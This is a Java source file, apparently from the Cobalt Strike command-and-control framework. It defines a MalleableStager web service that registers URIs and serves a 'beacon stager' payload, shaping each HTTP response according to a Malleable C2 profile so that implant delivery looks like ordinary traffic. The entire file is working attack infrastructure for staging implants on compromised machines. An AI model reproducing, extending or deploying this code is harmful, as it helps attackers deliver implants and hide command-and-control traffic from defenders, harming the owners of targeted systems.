package c2profile;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;

import java.io.ByteArrayInputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

public class MalleableStager implements WebService {
    protected Profile profile;
    protected byte[] resource;
    protected String key;
    protected String arch;
    protected String ex_uri = null;

    public MalleableStager(Profile profile, String key, byte[] resource, String arch) {
        this.resource = resource;
        this.profile = profile;
        this.key = key;
        this.arch = arch;
    }

    @Override
    public void setup(WebServer w, String uri) {
        w.register(uri, this);
        if (this.profile.hasString(this.key + ".uri_" + this.arch)) {
            this.ex_uri = this.profile.getString(this.key + ".uri_" + this.arch);
            w.registerSecondary(this.ex_uri, this);
        }
    }

    @Override
    public Response serve(String uri, String method, Properties header, Properties param) {
        Response r;
        if (this.ex_uri != null && uri.equals(this.ex_uri)) {
            r = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(this.resource), this.resource.length);
            if (this.profile.hasString(this.key + ".server")) {
                this.profile.apply(this.key + ".server", r, this.resource);
            }
        } else {
            r = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(new byte[0]), 0L);
            if (this.profile.hasString(this.key + ".server")) {
                this.profile.apply(this.key + ".server", r, this.resource);
            }
            r.data = new ByteArrayInputStream(this.resource);
            r.size = this.resource.length;
            r.offset = 0L;
            r.addHeader("Content-Length", this.resource.length + "");
        }
        return r;
    }

    public String toString() {
        return "beacon stager " + this.arch;
    }

    @Override
    public String getType() {
        return "beacon";
    }

    @Override
    public List cleanupJobs() {
        return new LinkedList();
    }

    @Override
    public boolean suppressEvent(String uri) {
        return false;
    }

    @Override
    public boolean isFuzzy() {
        return false;
    }
}

